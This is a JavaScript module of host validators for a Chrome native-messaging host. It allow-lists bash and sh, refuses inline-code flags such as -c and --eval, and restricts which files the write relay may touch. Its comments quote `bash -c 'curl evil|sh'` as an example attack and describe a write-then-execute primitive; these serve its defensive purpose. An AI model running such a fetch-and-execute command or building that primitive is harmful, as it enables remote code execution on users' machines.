// Host validators (INFOSEC F3). Extracted from host.cjs so the
// allow-lists + check functions can be unit-tested without spawning
// the native-messaging process.
//
// Pure: no fs access. Path sandboxing (realpath, CUE_ROOT containment)
// lives in host.cjs and runs BEFORE these checks — these gate AFTER
// path-resolution.

'use strict';

const path = require('node:path');

/** Interpreters the chrome-host's `exec` relay will spawn. Anything
 *  else (node/python/curl/osascript/...) is refused. Absolute paths
 *  that resolved under CUE_ROOT are also permitted; checked at the
 *  call site. */
const INTERPRETER_ALLOWLIST = new Set(['bash', 'sh']);

/** Inline-code flags that turn an interpreter into arbitrary shell
 *  execution. `bash -c 'curl evil|sh'` is the canonical attack
 *  shape — refuse the flag regardless of its operand. */
const INLINE_CODE_FLAG_PATTERN = /^(?:-c|--command|-e|--eval|-p|--exec|--cmd|-i|--inline|--source)$/;

/** Basenames the chrome-host's `write-file` relay will write. Today
 *  only OPENCUES.md is actually written by the runtime; the rest are
 *  forward-compat for the in-editor identity-write surface. Pre-F3
 *  the relay accepted any path under CUE_ROOT — which paired with
 *  `exec` to form a write-then-execute primitive (drop a malicious
 *  blanks/x/blank.js, the registry auto-loads + executes on next
 *  fs.watch tick). */
const WRITABLE_BASENAMES = new Set([
  'OPENCUES.md',
  'IDENTITY.md',
  'CUES.md',
]);

/**
 * Returns true iff the (path-sandboxed) target is a permitted basename.
 * Caller is responsible for ensuring the path resolves under CUE_ROOT.
 */
function isWritableTarget(safePath) {
  if (typeof safePath !== 'string' || !safePath) return false;
  return WRITABLE_BASENAMES.has(path.basename(safePath));
}

/**
 * Returns the first violation as a string, or null if exec spec passes.
 *
 *   command — the command name OR absolute path; the caller has already
 *             sandboxed absolute paths to CUE_ROOT.
 *   args    — array of strings.
 *   isAbsoluteUnderCueRoot — true iff `command` was an absolute path
 *             that resolved under CUE_ROOT (compiled binary case).
 */
function validateExec({ command, args, isAbsoluteUnderCueRoot }) {
  if (typeof command !== 'string' || !command) return 'missing command';
  if (!Array.isArray(args)) return 'args must be an array';

  const isAllowed = INTERPRETER_ALLOWLIST.has(command) || isAbsoluteUnderCueRoot;
  if (!isAllowed) {
    return `command not in allow-list (F3): ${command}. ` +
      `Permitted: ${[...INTERPRETER_ALLOWLIST].sort().join(', ')} or an absolute path under CUE_ROOT.`;
  }

  for (const a of args) {
    if (typeof a !== 'string') continue;
    if (INLINE_CODE_FLAG_PATTERN.test(a)) {
      return `inline-code flag refused (F3): ${a}. ` +
        `Scripts must come from a file under CUE_ROOT, not -c/--eval.`;
    }
  }

  if (INTERPRETER_ALLOWLIST.has(command)) {
    const first = args[0];
    if (typeof first !== 'string' || !first) {
      return `${command} requires args[0] to be a script path (F3).`;
    }
    // args[0] must look like an absolute path or a chrome-storage virtual
    // path. We don't realpath here (caller does); just refuse anything
    // that's clearly not a path (e.g. a bare flag).
    if (first.startsWith('-')) {
      return `args[0] looks like a flag, not a script path (F3): ${first}`;
    }
  }

  return null;
}

module.exports = {
  INTERPRETER_ALLOWLIST,
  INLINE_CODE_FLAG_PATTERN,
  WRITABLE_BASENAMES,
  isWritableTarget,
  validateExec,
};
